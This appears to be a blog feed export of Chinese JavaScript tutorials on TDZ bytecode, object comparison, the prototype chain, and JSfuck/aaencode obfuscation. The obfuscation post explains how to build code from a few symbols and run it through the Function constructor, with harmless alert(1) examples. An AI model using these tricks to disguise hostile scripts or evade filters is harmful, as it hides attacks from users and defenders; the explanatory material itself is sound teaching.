LdaTheHole                    // 把 hole 載入到 acc 去Star r0                       // r0 = holeStackCheck LdaGlobal [0], [2]            Star r2                       // r2 = consoleLdaNamedProperty r2, [1], [4]Star r1                       // r1 = console.logLdar r0                       // 載入 r0ThrowReferenceErrorIfHole [2] // 拋出錯誤CallProperty1 r1, r2, r0, [0] // console.log.call(console, r0)LdaSmi [10]Star r0LdaUndefined Return

你會看到多了一個神秘的東西叫做 hole，這個其實就是我們所說的 TDZ，所以才會有 ThrowReferenceErrorIfHole 那一行，就代表說在 TDZ 結束之前我們如果試圖去存取這個 hole 的值都會拋出錯誤。
至此，也解釋了 TDZ 實際上在編譯階段是如何運作的，就是透過 hole 這個特別的東西。
總結最近開始補齊自己對 JavaScript 的一些基礎知識，不補還好，一補下去發現自己懂的東西比自己想像中還少，我要先感謝兩篇文章：解读ECMAScript[1]——执行环境、作用域及闭包、JS 作用域，這兩篇是我的啟蒙導師，如果沒看到這兩篇，大概也不會有這篇文章的出現。
JavaScript 常考的幾個點大家都耳熟能詳：this、prototype、clousre 跟 hoisting，而這幾個看似不相關的東西，其實只要你能理解 JavaScript 背後的運作模型，都能夠多少串得起來，成為一個完整的理論。
我在文中也有提到，上面講述執行環境的那段過程，其實補充得更完整以後就可以拿來解釋 clousre，就會發現很多東西其實都能融會貫通。日後有機會可以把這整套變成一系列，一一擊破 JavaScript 那些你以為很難但其實沒有的概念。
寫這篇以前我大概醞釀了一個月，不斷找資料以後消化並且轉化為自己的理解，也很感謝上面那篇 JS 作用域的作者以及 YDKJS 的作者耐心解惑。
最後，也希望這篇文章對你們有幫助，有任何錯誤都可以跟我反映，感謝。
參考資料：

MDN: Hoisting
ECMA-262-3 in detail. Chapter 2. Variable object.
JS 作用域
JavaScript Optimization Patterns (Part 2)
danbev&#x2F;learning-v8
Why is there a “temporal dead zone” in ES6?
exploringjs: Variables and scoping #
ES6 中的 TDZ（temporal dead zone）及函数作用域
由阮一峰老师的一条微博引发的 TDZ 思考
理解ES6中的暂时死区(TDZ)
TEMPORAL DEAD ZONE (TDZ) DEMYSTIFIED
MDN: let
Grokking V8 closures for fun (and profit?)
解读ECMAScript[1]——执行环境、作用域及闭包

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>hoisting</tag>
      </tags>
  </entry>
  <entry>
    <title>讓 JavaSript 難以閱讀：jsfuck 與 aaencode</title>
    <url>/2016/07/16/javascript-jsfuck-and-aaencode/</url>
    <content><![CDATA[前言在進入今天的主題之前，先推薦大家看一個影片 WAT：A lightning talk by Gary Bernhardt from CodeMash 2012。在這個影片裡面，講者會為大家示範 JavaScript 到底有多「神奇」。而這些神奇的特性，也會跟我們之後所要介紹的兩個東西有關。
先從 Brainfuck 開始大家有聽過 Brainfuck 嗎？顧名思義，就是會讓你超級頭痛的一個程式語言，只用下面這八個字元就可以寫出一個完整的程式：




&lt;








.
,
[
]

而這幾種字元如果對應到 C 的程式碼，就是：

++ptr;
–ptr;
++*ptr;
–*ptr;
putchar(*ptr);
*ptr &#x3D;getchar();
while (*ptr) {
}

（資料來源：wikipedia: Brainfuck）Brainfuck 內建會給你一組陣列，並且讓 ptr 指向陣列開頭，剩下的事情就交給我們自己了，舉例來說，輸出 Hello World 的程式長這樣：
++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.

如果想看更多範例可以參考維基百科，上面有附一些說明。由於 Brainfuck 並不是今天的重點，因此只是稍微跟大家介紹一下而已。
JSfuck接著就是我們今天的第一個主角：JSfuck，我們先來看一段 JSfuck 的程式碼：

現在你知道它為什麼取做這個名稱了吧！與 Brainfuck 相似，JSfuck 只有六個字元：

[
]
(
)
!





可是 JSfuck 與 Brainfuck 最大的差別就在於，JSfuck 其實是把你的 JavaScript 程式碼轉換成這樣的形式，而不是像 Brainfuck 那樣，每一個符號都有自己代表的動作。接著就讓我們來看看 JSfuck 的原理到底是什麼吧！  
Function Constructor如果想要執行一段字串裡面的程式碼，可以怎麼做呢？你可能會用 eval，但其實還有一個方法，就是 Function Constructor，你可以傳入一段字串，那段字串就會被當做程式碼來運行，舉例來說：
new Function(&#x27;alert(1)&#x27;)();

上面這段程式碼就會做跟 alert(1) 一樣的事情不只如此，其實連參數名稱都可以傳入！
new Function(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;return a+b;&#x27;)(1, 2);// 3

這一段先到這邊暫時打住，等等再回來看。但是現在知道一個很重要的事實了：只要你有一段文字，就可以用 Function Constructor 的方式去執行。
如何湊出程式碼？那我們下一個要達成的目標就是，湊出所有的文字，並且都是用那六個字元組成，不就可以執行了嗎？
先從數字開始吧，看看怎樣可以湊出數字。但其實我們也只要湊出 0 跟 1 就好，因為其他正整數都可以透過這兩個數字拼湊起來。  
+[]可以湊出 0，或者也可以換一個思路，![]會是 false，所以+![]也會是 0，有 0 之後，要變出 1 就不難了，因為 ![] 是 false，所以 !![] 就是 true。那 +!![] 就是數字的 1。
數字有了，接下來是文字跟符號，文字的話你可能會直接想到：String.fromCharCode，只要能湊出這段文字，你就能湊出其他任何文字或符號了。  
但我們先來看看一個比較特別的方法，例如說 ![] 是 false，然後 []+[] 是空字串，所以把兩個加起來，![]+[]+[]就會是字串的 &quot;false&quot;（其實 ![]+[] 就可以了），那我是不是可以用：&quot;false&quot;[0] 取得 f 這個字元？  
把字串 &quot;false&quot; 用上面的那串取代，就會變成：(![]+[]+[])[0]，那 0 又可以用我們上面得出的+[]取代，就變：(![]+[]+[])[+[]]，這樣你就成功用這幾個字元湊出 f 這個字了，酷吧！
其他的文字跟符號也是相同原理，你可以從各個 JavaScript 的程式碼裡面找到許多文字的蹤跡，例如說 undefined，如果你想知道所有的文字是怎麼湊出來的，可以參考：JSfuck 原始碼。
把上面結合起來現在有了 Function Constructor 跟要執行的文字，是不是就可以完成我們想做的事了。可是 new Function() 要怎麼用這六個字元湊出來呢？  
一個空的陣列[]有很多原生的 JavaScript function，像是 map 好了，[].map 就可以得到 map 這個 function，有了 function 之後，只要用 map.function.constructor，就可以拿到 Function Constructor了！ 就像 &quot;&quot;.constructor 也可以拿到 String Constructor 一樣。
而且.可以用[]取代，[].map會變成[][&#39;map&#39;]，這樣結合下來，就變成：
[][&#x27;map&#x27;][&#x27;constructor&#x27;][][&#x27;map&#x27;][&#x27;constructor&#x27;](&#x27;alert(1)&#x27;)(); // 可以順利執行

接著就是把 map 跟 constuctor 這兩個字用上面的方法湊出來，不是就可以了嗎？  
做到這裡，相信大家應該比較瞭解 JSfuck 的原理了，就是用許多特別的技巧湊出文字、湊出 Function Constructor 來執行那段文字。
接著，我們介紹一個原理類似，但更可愛的東西！
用顏文字寫程式
可愛吧！居然可以把 JavaScript 變成一堆顏文字！aaencode 跟 JSfuck 又有一點小差異了，因為aaencode可以用到的字元比較多，只是長得比較可愛而已，那既然JSfuck可以做到，aaencode沒什麼理由做不到。
接著讓我們仔細看一段 aaencode 轉出來的程式碼：（因為有些特殊字元的關係，可能會顯示不出來，但不影響整體的閱讀，看個感覺就好）
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)],ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ) +&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ)  [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ)   +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;)    [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+    ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ)     [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟ    Θﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+     ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);

仔細觀察會發現裡面其實有很多分號，是把很多行組合在一起，我們挑裡面比較短的一行來看：（底下的程式碼因為特殊字元的關係有多做一點處理，跟原本的有些許差異）
o=（˙_˙）  =_=3; 

看起是顏文字，但其實沒那麼簡單，我把空格隔多一點，你就知道我在講什麼了：
o = （˙_˙）   =  _  = 3; 


其實就是：
_ = 3;（˙_˙） = _;o = （˙_˙）  ;

也就是讓 o, （˙_˙）, _ 都是 3所以 ˙_˙ 只是一個變數名稱，然後用 () 包起來變成顏文字，但這括弧在程式上其實沒有什麼意義
至於其他段的程式碼，做的事情也都大同小異，有興趣的讀者們可以自己再去分析，或者直接右鍵-&gt;檢視原始碼去看看是怎麼 encode 的。
結論我第一次看到 aaencode 的時候也是：「哇！」嚇了一跳，不解為什麼用顏文字也可以寫程式，後來仔細看才了解到其實顏文字本來就是一堆符號組成的，可以寫出程式也是件很正常的事情。  
但每次看到今天介紹的這兩種特別的寫法，還是很佩服作者，當初怎麼想到可以用這樣子來寫程式。希望這篇文章的介紹能讓大家對程式碼有點新的想法，說不定給了你靈感，可以開發出更厲害的寫法。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>jsfuck</tag>
        <tag>aaencode</tag>
      </tags>
  </entry>
  <entry>
    <title>理解 JavaScript 中物件的比大小行為</title>
    <url>/2019/06/16/javascript-obj-compare/</url>
    <content><![CDATA[前言在 JavaScript 中很多行爲用其他程式語言的角度或是直觀角度來看都非常不合理。有些人知道這些行為，但不了解內部運作方式。而我自己在學習時，會嘗試了解內部的行為。了解過後，之後遇到同樣行為時，很自然的就知道某行為應該回傳什麼樣的值，而不再認為這是一顆地雷。
這篇文章要探討的是 JavaScript 在兩個物件中互相比較所用的依據為何。網路上大部分的文章都只有討論 ==, !=, === 以及 !==。這篇文章要探討的是 在兩個物件之間使用大於小於去比較 JavaScript 如何處理這一件事情。
先看幾種常見的情況先複習一下幾種不同型態之間的比較依據
&gt; 100 &gt; 10true&gt; 100 &gt; &quot;10&quot; //(字串與數字比較，會將字串轉為數字來比較，使用 Number()轉型)true&gt; &quot;100&quot; &gt; &quot;10&quot; //(兩者都是字串，按照 ascii code 比大小，如果相等就往下一個字元比。切記！並不是將兩個字串都轉為數字來比較)true&gt; &quot;abc&quot; &gt; &quot;aaa&quot; //(同上述)true&gt; &quot;ab&quot; &gt; &quot;ac&quot;false

物件的比較規則來點科普這次的重點在於兩個物件的比較是依據何者來比較，首先要先知道 JavaScript 有幾種型態

null
undefined
boolean
number
string
symbol
object

所有 JavaScript 的型態都在這七種之內。然而，除了 object 以外，都屬於基本型態(primitive data type)。
比較的依據物件的比較流程為以下(若成功則停，失敗則往下一步)：

呼叫物件內的 valueOf 方法求得 return 值(值必須為 primitive data type)

(若非 primitive data tpye 或是沒有 valueOf 方法則往下)

呼叫 toString 方法求得 return 值(值必須為 primitive data type)

(若非 primitive data tpye 或是沒有 valueOf 方法則往下)

拋出錯誤 (TypeError: Cannot convert object to primitive value)

進行實驗
實驗一 (object 內的 valueOf)：

let obj = &#123;    valueOf() &#123;        return 123;    &#125;,    toString() &#123;        return &#123;&#125;;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);//output: great!


實驗二 (valueOf 回傳值不是 primitive data type)：

let obj = &#123;    valueOf() &#123;        return &#123;&#125;;    &#125;,    toString() &#123;        return 123;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);//output: great!


實驗三 (valueOf 與 toString 的比較順序)：

let obj = &#123;    valueOf() &#123;        return 200;    &#125;,    toString() &#123;        return 50;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);else console.log(&quot;QQ&quot;);//output: great!

let obj = &#123;    valueOf() &#123;        return 50;    &#125;,    toString() &#123;        return 200;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);else console.log(&quot;QQ&quot;);//output: QQ


實驗四（兩者回傳值都非為 primitive data type，拋出錯誤）

let obj = &#123;    valueOf() &#123;        return &#123;&#125;;    &#125;,    toString() &#123;        return &#123;&#125;;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);//output://if (obj &gt; 100) console.log(&quot;great!&quot;);//        ^//TypeError: Cannot convert object to primitive value//    at Object.&lt;anonymous&gt; (/Users/yiyuchang/dev/tmp/article/example.js:10:9)//    ......

空物件預設的 valueOf, toString 為何let obj = &#123;&#125;;console.log(obj.valueOf());console.log(obj.toString());if (obj == &quot;[object Object]&quot;) console.log(&quot;great!&quot;);//output:////&#123;&#125;//[object Object]//great!

預設情況下物件是的 valueOf 是回傳空物件 {}，而 toString 則是回傳 [object Object] 字串！
結論透過以上的實驗，除了知道物件依據何者來比較大小。相信也對 valueOf 以及 toString 有更深一層的了解。如此一來對物件這個屬性的行為也能加以掌握。
JavaScript 的型態簡單來說就如同前面所說，一類為 primitive data type 另外一類就是物件(object)。很多新手常常搞混的行為其實也就只是這兩種屬性不太了解罷了。
像是:
let str = &#x27;hi&#x27;let str2 = String(&#x27;hi&#x27;)

這兩個字串的內容到底一樣不一樣？用 == 以及 === 的回傳值為何？

兩個變數內容都是 ‘hi’，所以用 == 的結果會是 true
他們都是 primitive data type，所以用 === 包含型態也一起比較當然也會一樣

但如果用 new String(&#39;hi&#39;) 產生出來是一個物件，所以與前面兩者用 === 比較結果則會是 false。
理解這些平常不會仔細思考的問題更有助於掌握這門語言，日後我也會時常將我的學習歷程寫成文章，發佈於我的部落格與此，謝謝大家仔細看完這篇文章。
關於作者大家好，我是 yiyu。在網路上都用 yiyu0x 作為我的 id。目前是資訊工程學系大三的學生，平常喜歡寫程式，用程式解決日常生活中的問題。JavaScript 是一門近期我非常熱愛的語言，相較於其他語言，豐富的套件以及異步的特性是我熱愛它的原因。此篇文章也同時刊登於我的個人 blog。
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>該來理解 JavaScript 的原型鍊了</title>
    <url>/2017/04/22/javascript-prototype/</url>
    <content><![CDATA[前言老實說 JavaScript 的原型鍊一直是我很懼怕的一個主題，理由很簡單，因為真的不太好理解。光是一堆名詞跟錯綜複雜的關係就可以把你搞瘋，例如說prototype, __proto__, constructor, Object.prototype, Function.prototype, new等等。
可是呢，這又確實是 JavaScript 很重要的一部分，而且是面試的必考題，就算現在不懂，以後遲早有一天要把它弄懂，不然的話永遠都沒辦法把自己的技術能力往上提高一個檔次。
有關原型鍊的文章你可以在網路上搜到一大堆，每一篇的理解方式都不太一樣，有些直接搬出一大堆專有名詞，嚇都把你嚇死了。而我也是一直到最近，看了幾篇我覺得切入角度比較不錯的文章，才真正對原型鍊有比較深刻的理解。
就趁著現在這個機會，讓我們多瞭解一點 JavaScript 的原型鍊吧！這篇適合對 JavaScript 有一點概念但又不是很清楚的人觀看，如果文章中有講錯的地方，也麻煩不吝在評論中指出，感謝。
JavaScript 中的 class要理解原型鍊，可以先從這兩篇我覺得很棒的切入角度開始：

Javascript继承机制的设计思想
从设计初衷解释 JavaScript 原型链

這兩篇講到為什麼當初 JavaScript 的機制是這樣設計的，我認為從這個角度開始理解，會是一個比較好的開始。（強烈建議先看過這兩篇之後再往下看，會幫助你更瞭解原型鍊到底是什麼東西）
首先呢，JavaScript 不像 Java 或是其他物件導向的程式語言，它是沒有 class 的（ES6 的 class 也只是語法糖而已）。可是儘管沒有 class，卻還是可以設計出一個類似的機制來達成差不多的功能。
在 Java 裡面，如果你要從 class 生出一個 instance 的話，你可以這樣寫：
Point p = new Point();

於是 JavaScript 就把這個語法拿來用，有了new這個關鍵字。可是 JavaScript 又沒有 class，new後面要接什麼呢？
這時候他就想到，每一個 class 在初始化的時候，不是都會呼叫 constructor 嗎？也就是構造函數，那在 JavaScript 裡面，後面就接構造函數吧！
於是，下面的程式碼就很好理解了：
// constructorfunction Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  var nick = new Person(&#x27;nick&#x27;, 18);var peter = new Person(&#x27;peter&#x27;, 18);

就如同上面講到的一樣，Person就是一個構造函數，可以用new這個關鍵字 new 出一個 instance 來。
如果你只看下面宣告 nick 那一行（var nick = new Person(&#39;nick&#39;, 18);），語法是不是跟你在寫 Java 的時候有 87 分像？除此之外，你也可以幫Person加入一些方法。
function Person(name, age) &#123;  this.name = name;  this.age = age;  this.log = function () &#123;    console.log(this.name + &#x27;, age:&#x27; + this.age);  &#125;&#125;  var nick = new Person(&#x27;nick&#x27;, 18);nick.log(); // nick, age:18  var peter = new Person(&#x27;peter&#x27;, 20);peter.log(); // peter, age:20

可是這樣其實還有一個小問題， name 跟 age 這兩個屬性，很明顯是每一個 instance 都會不一樣的。可是 log 這個 method，其實是每一個 instance 彼此之間可以共享的，因為都在做同一件事情。
在現在這種情況下，雖然 nick 的 log 這個 function 跟 peter 的 log 這個 function 是在做同一件事，但其實還是佔用了兩份空間，意思就是他們其實是兩個不同的 function。
function Person(name, age) &#123;  this.name = name;  this.age = age;  this.log = function () &#123;    console.log(this.name + &#x27;, age:&#x27; + this.age);  &#125;&#125;  var nick = new Person(&#x27;nick&#x27;, 18);var peter = new Person(&#x27;peter&#x27;, 20);  console.log(nick.log === peter.log) // false

那怎麼辦呢？我們可以把這個 function 抽出來，變成所有 Person 都可以共享的方法。講到這邊，你應該有聽過一個東西叫做prototype。只要把 log 這個 function 指定在 Person.prototype 上面，所有 Person 的 instance 都可以共享這個方法。
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);var peter = new Person(&#x27;peter&#x27;, 20);  console.log(nick.log === peter.log) // true  // 功能依舊跟之前一樣nick.log(); // nick, age:18peter.log(); // peter, age:20

有些人會直接在 Array.prototype 上面加一些函式，讓自己可以更方便地做一些操作，原理也是這樣。可是一般來說，不推薦直接去修改不屬於你的 Object。
Array.prototype.last = function () &#123;    return this[this.length - 1];&#125;;  console.log([1,2,3].last()) // 3

最後幫大家總結一下，上面這一段其實主要是幫大家複習一下 JavaScript 的一些基礎。
你有一個叫做Person的函數，就可以把Person當作 constructor，利用var obj = new Person()來 new 出一個Person的 instance，並且可以在Person.prototype上面加上你想讓所有 instance 共享的屬性或是方法。
探究原理不知道你會不會好奇一件事，以上面var nick = new Person(&#39;nick&#39;, 18);的例子來說，當我在呼叫nick.log()的時候，JavaScript 是怎麼找到這個 function 的？
因為 nick 這個 instance 本身並沒有 log 這個 function。但根據 JavaScript 的機制，nick 是 Person 的 instance，所以如果在 nick 本身找不到，它會試著從Person.prototype去找。
可是，JavaScript 怎麼知道要到這邊去找？所以一定是 nick 跟Person.prototype會透過某種方式連接起來，才知道說要往哪邊去找 log 這個 function。
而這個連接的方式，就是__proto__。（附註：其實比較好的方式是用Object.getPrototypeOf()，但這邊為了方便起見，還是使用比較常見的__proto__，更詳細的說明可參考：MDN: Object.prototype.proto）
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  console.log(nick.__proto__ === Person.prototype) // true

nick 的__proto__會指向Person.prototype，所以在發現 nick 沒有 log 這個 method 的時候，JavaScript 就會試著透過__proto__找到Person.prototype，去看Person.prototype裡面有沒有 log 這個 method。
那假如Person.prototype還是沒有呢？那就繼續依照這個規則，去看Person.prototype.__proto__裡面有沒有 log 這個 method，就這樣一直不斷找下去。找到時候時候為止？找到某個東西的__proto__是 null 為止。意思就是這邊是最上層了。
而上面這一條透過__proto__不斷串起來的鍊，就叫做原型鍊。透過這一條原型鍊，就可以達成類似繼承的功能，可以呼叫自己 parent 的 method。
看下面這段程式碼你大概會有一些感覺：
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  // 這個剛講過了，nick.__proto__ 會指向 Person.prototypeconsole.log(nick.__proto__ === Person.prototype) // true  // 那 Person.prototype.__proto__ 會指向誰呢？會指向 Object.prototypeconsole.log(Person.prototype.__proto__ === Object.prototype) // true  // 那 Object.prototype.__proto__ 又會指向誰呢？會指向 null，這就是原型鍊的頂端了console.log(Object.prototype.__proto__) // null

如果想知道一個屬性是存在 instance 身上，還是存在於它屬於的原型鍊當中，可以用hasOwnProperty這個方法：
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);console.log(nick.hasOwnProperty(&#x27;log&#x27;)); // falseconsole.log(nick.__proto__.hasOwnProperty(&#x27;log&#x27;)); // true

有了hasOwnProperty之後，我們就可以自己來模擬這段往上找的過程：
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  function call(obj, methodName) &#123;  var realMethodOwner = obj;    // 不斷往上找，直到 null 或者是找到真的擁有這個 method 的人為止  while(realMethodOwner &amp;&amp; !realMethodOwner.hasOwnProperty(methodName)) &#123;    realMethodOwner = realMethodOwner.__proto__;  &#125;    // 找不到就丟一個 error，否則執行這個 method  if (!realMethodOwner) &#123;    throw &#x27;method not found.&#x27;;  &#125; else &#123;    realMethodOwner[methodName].apply(obj);  &#125;&#125;  call(nick, &#x27;log&#x27;); // nick, age:18call(nick, &#x27;not_exist&#x27;); // Uncaught method not found.

做到這邊，其實你已經對原型鍊有了比較深刻的了解了。
來考你一題，Person.__proto__會是什麼？
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  console.log(Person.__proto__ === Function.prototype); // trueconsole.log(Function.prototype.__proto__ === Object.prototype) // trueconsole.log(Object.prototype.__proto__); //null

因為Person其實就是個 Function 的 instance，所以Person.__proto__當然就是Function.prototype囉！
instanceof顧名思義，A instanceof B 就是拿來判斷 A 是不是 B 的 instance，舉例來說：
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  console.log(nick instanceof Person); // trueconsole.log(nick instanceof Object); // trueconsole.log(nick instanceof Array); // false

從範例中可以看出，只要能在 A 的原型鍊裡面找到 B 的 prototype，就會回傳 true。知道原理之後，我們也可以來簡單模擬一下 instnaceof 在做的事：
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  function instanceOf(A, B) &#123;    // 已經找完了  if (!A) return false;    // 沒找到的話，繼續往上找  return A.__proto__ === B.prototype ? true : instanceOf(A.__proto__, B);&#125;  console.log(instanceOf(nick, Person)); // trueconsole.log(instanceOf(nick, Object)); // trueconsole.log(instanceOf(nick, Array)); // false

而 instanceof 有一個很有趣的現象，那就是：
// 這兩個互為彼此的 instanceconsole.log(Function instanceof Object); // trueconsole.log(Object instanceof Function); // true  // Function 的 __proto__ 會指向 Function.prototype// 而 Function.prototype 的 __proto__ 會指向 Object.prototypeconsole.log(Function.__proto__ === Function.prototype); // trueconsole.log(Function.__proto__.__proto__ === Object.prototype); //true  // Object 的 __proto__ 會指向 Function.prototypeconsole.log(Object.__proto__ === Function.prototype); // true

這個東西又會把問題搞得更複雜，在這邊就先不提了。如果想知道的話，可以參考下面這兩篇文章：

从__proto__和prototype来深入理解JS对象和原型链
理解JavaScript的原型链和继承

constructor順帶一提，每一個 prototype 都會有一個叫做constructor的屬性，例如說Person.prototype.constructor，而這個屬性就會指向構造函數。Person.prototype的構造函數是什麼？當然就是Person囉。
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  // 這段是要讓大家知道，這邊其實是往原型鍊的上面去找console.log(nick.constructor === Person); // trueconsole.log(nick.hasOwnProperty(&#x27;constructor&#x27;)); // false  // Person 的 constructor 就是 Personconsole.log(Person.prototype.constructor === Person); // trueconsole.log(Person.prototype.hasOwnProperty(&#x27;constructor&#x27;)); // true

所以其實constructor也沒什麼好講的，A.prototype.constructor === A，你把 A 用 Function, Person, Object 之類的值帶進去都成立。
有一個比較有趣的地方是，你可以透過這樣的方式來執行一段程式碼：[].slice.constructor(&#39;alert(1)&#39;)()。原理其實就是把Function(&#39;alert(1)&#39;)()的Function用[].slice.constructor來取代掉。
new有了原型鍊的概念之後，就不難理解new這個關鍵字背後會做的事情是什麼。
假設現在有一行程式碼是：var nick = new Person(&#39;nick&#39;);，那它有以下幾件事情要做：

創出一個新的 object，我們叫它 O
把 O 的 __proto__ 指向 Person 的 prototype，才能繼承原型鍊
拿 O 當作 context，呼叫 Person 這個建構函式
回傳 O

我們可以寫一段程式碼來模擬這個情形：
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  function newObj(Constructor, arguments) &#123;  var o = new Object();    // 讓 o 繼承原型鍊  o.__proto__ = Constructor.prototype;    // 執行建構函式  Constructor.apply(o, arguments);    // 回傳建立好的物件  return o;&#125;  var nick = newObj(Person, [&#x27;nick&#x27;, 18]);nick.log(); // nick, age:18

延伸閱讀：JS 对象机制深剖——new 运算符
總結今天不但更理解了原型鍊到底是什麼東西，也寫了一些簡單的小程式來模擬 JavaScript 在查找原型鍊的過程。藉由自己實作這些機制之後，應該會對原型鍊有更多的一些理解。
